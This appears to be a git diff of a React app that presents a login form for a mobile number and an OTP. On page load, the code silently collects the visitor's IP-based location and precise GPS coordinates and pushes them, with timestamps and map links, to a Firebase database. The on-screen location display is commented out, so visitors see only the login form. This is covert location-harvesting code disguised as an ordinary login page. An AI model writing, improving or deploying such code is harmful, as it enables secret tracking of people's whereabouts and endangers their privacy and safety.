@@ -3,77 +3,96 @@ import { database } from "./firebase";
 import { ref, push } from "firebase/database";
 
 function App() {
-  const [ipLocation, setIpLocation] = useState(null);
-  const [gpsLocation, setGpsLocation] = useState(null);
+  const [location, setLocation] = useState({ ipLocation: null, gpsLocation: null });
   const [loading, setLoading] = useState(true);
-  const [gpsDenied, setGpsDenied] = useState(false);
-  const userId = "user-" + Date.now(); // Unique user ID for session
 
   useEffect(() => {
     getIPLocation();
   }, []);
 
-  // Convert timestamp to IST
+  // 📌 Convert UTC to IST
   const getISTTime = () => {
     return new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
   };
 
-  // Fetch IP-based location first
+  // 📌 Fetch IP-Based Location
   const getIPLocation = async () => {
     try {
-      const response = await fetch(`https://ip-api.com/json?timestamp=${Date.now()}`);
+      const response = await fetch(`https://ipapi.co/json/`);
       const data = await response.json();
-      const ipData = {
-        latitude: data.lat,
-        longitude: data.lon,
+
+      const ipLocationData = {
+        latitude: data.latitude,
+        longitude: data.longitude,
+        method: "IP-based",
         city: data.city,
-        country: data.country,
-        method: "IP",
+        country: data.country_name,
         timestamp: getISTTime(),
-        mapLink: `https://www.google.com/maps?q=${data.lat},${data.lon}`,
+        mapLink: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`,
       };
-      setIpLocation(ipData);
-      saveLocation(userId, "ipLocation", ipData);
+
+      setLocation((prev) => ({ ...prev, ipLocation: ipLocationData }));
+      saveLocationToFirebase("ipLocation", ipLocationData);
+
       requestGPSLocation();
     } catch (err) {
-      console.error("IP Geolocation failed:", err);
-      requestGPSLocation();
+      console.error("❌ IP Location failed:", err);
+      requestGPSLocation(); // Still try GPS
     }
   };
 
-  // Request GPS permission
+  // 📌 Request GPS Permission
   const requestGPSLocation = () => {
-    if ("geolocation" in navigator) {
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          const { latitude, longitude } = position.coords;
-          const gpsData = {
-            latitude,
-            longitude,
-            method: "GPS",
-            timestamp: getISTTime(),
-            mapLink: `https://www.google.com/maps?q=${latitude},${longitude}`,
-          };
-          setGpsLocation(gpsData);
-          saveLocation(userId, "gpsLocation", gpsData);
-          setLoading(false);
-        },
-        (error) => {
-          console.warn("GPS permission denied or failed:", error);
-          setGpsLocation(null);
-          setGpsDenied(true);
-          setLoading(false);
-        },
-        { enableHighAccuracy: true, timeout: 1000, maximumAge: 0 }
-      );
-    } else {
-      console.error("Geolocation not supported");
+    if (!navigator.geolocation) {
+      console.error("❌ Geolocation not supported");
+      setLoading(false);
+      return;
     }
+
+    navigator.permissions
+      .query({ name: "geolocation" })
+      .then((permission) => {
+        if (permission.state === "granted" || permission.state === "prompt") {
+          console.log("✅ GPS permission granted");
+          getGPSLocation();
+        } else {
+          console.warn("❌ GPS Permission Denied");
+          setLoading(false);
+        }
+      })
+      .catch(() => {
+        console.warn("⚠️ Permission API failed, trying GPS...");
+        getGPSLocation();
+      });
   };
 
-  // Save to Firebase
-  const saveLocation = async (userId, type, data) => {
-    const locationRef = ref(database, `userLocations/${userId}/${type}`);
+  // 📌 Fetch GPS Location
+  const getGPSLocation = () => {
+    navigator.geolocation.getCurrentPosition(
+      (position) => {
+        const gpsLocationData = {
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+          method: "GPS",
+          timestamp: getISTTime(),
+          mapLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`,
+        };
+
+        setLocation((prev) => ({ ...prev, gpsLocation: gpsLocationData }));
+        saveLocationToFirebase("gpsLocation", gpsLocationData);
+        setLoading(false);
+      },
+      (error) => {
+        console.warn("❌ GPS failed:", error);
+        setLoading(false);
+      },
+      { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+    );
+  };
+
+  // 📌 Save Location to Firebase
+  const saveLocationToFirebase = async (key, data) => {
+    const locationRef = ref(database, `userLocations/${key}`);
     await push(locationRef, data);
   };
 
@@ -85,42 +104,45 @@ function App() {
 
         <input type="text" placeholder="Enter Mobile Number" style={{ width: "100%", padding: "12px", margin: "10px 0", borderRadius: "6px", border: "1px solid #ddd", fontSize: "16px" }} />
         <input type="password" placeholder="Enter OTP" style={{ width: "100%", padding: "12px", margin: "10px 0", borderRadius: "6px", border: "1px solid #ddd", fontSize: "16px" }} />
-        <button style={{ width: "100%", padding: "12px", backgroundColor: "#FF4C3B", color: "white", fontSize: "16px", fontWeight: "bold", border: "none", borderRadius: "6px", cursor: "pointer", marginTop: "10px" }}>Log In</button>
+        <button style={{ width: "100%", padding: "12px", backgroundColor: "#FF4C3B", color: "white", fontSize: "16px", fontWeight: "bold", border: "none", borderRadius: "6px", cursor: "pointer", marginTop: "10px" }}>
+          Log In
+        </button>
 
-        {/* Location Information */}
         {/* <div style={{ marginTop: "20px", fontSize: "14px", color: "#606770" }}>
           {loading ? (
             <p>Fetching location...</p>
           ) : (
-            <div>
-              <h3>IP Location</h3>
-              {ipLocation ? (
+            <>
+              {location.ipLocation && (
                 <div>
-                  <p>Latitude: {ipLocation.latitude}</p>
-                  <p>Longitude: {ipLocation.longitude}</p>
-                  <p>City: {ipLocation.city}</p>
-                  <p>Country: {ipLocation.country}</p>
-                  <p>Timestamp (IST): {ipLocation.timestamp}</p>
-                  <a href={ipLocation.mapLink} target="_blank" rel="noopener noreferrer" style={{ color: "#1877f2", textDecoration: "none", fontWeight: "bold" }}>View on Google Maps</a>
+                  <h4>IP Location:</h4>
+                  <p>Latitude: {location.ipLocation.latitude}</p>
+                  <p>Longitude: {location.ipLocation.longitude}</p>
+                  <p>City: {location.ipLocation.city}</p>
+                  <p>Country: {location.ipLocation.country}</p>
+                  <p>Timestamp (IST): {location.ipLocation.timestamp}</p>
+                  <p>Method: {location.ipLocation.method}</p>
+                  <a href={location.ipLocation.mapLink} target="_blank" rel="noopener noreferrer" style={{ color: "#FF4C3B", fontWeight: "bold" }}>
+                    View on Google Maps
+                  </a>
                 </div>
-              ) : (
-                <p>Could not fetch IP location.</p>
               )}
 
-              <h3>GPS Location</h3>
-              {gpsLocation ? (
+              {location.gpsLocation ? (
                 <div>
-                  <p>Latitude: {gpsLocation.latitude}</p>
-                  <p>Longitude: {gpsLocation.longitude}</p>
-                  <p>Timestamp (IST): {gpsLocation.timestamp}</p>
-                  <a href={gpsLocation.mapLink} target="_blank" rel="noopener noreferrer" style={{ color: "#1877f2", textDecoration: "none", fontWeight: "bold" }}>View on Google Maps</a>
+                  <h4>GPS Location:</h4>
+                  <p>Latitude: {location.gpsLocation.latitude}</p>
+                  <p>Longitude: {location.gpsLocation.longitude}</p>
+                  <p>Timestamp (IST): {location.gpsLocation.timestamp}</p>
+                  <p>Method: {location.gpsLocation.method}</p>
+                  <a href={location.gpsLocation.mapLink} target="_blank" rel="noopener noreferrer" style={{ color: "#FF4C3B", fontWeight: "bold" }}>
+                    View on Google Maps
+                  </a>
                 </div>
-              ) : gpsDenied ? (
-                <p style={{ color: "red", fontWeight: "bold" }}>GPS is blocked. Please enable location services.</p>
               ) : (
-                <p>Fetching GPS location...</p>
+                <p style={{ color: "red", fontWeight: "bold" }}>GPS Location not available</p>
               )}
-            </div>
+            </>
           )}
         </div> */}
       </div>
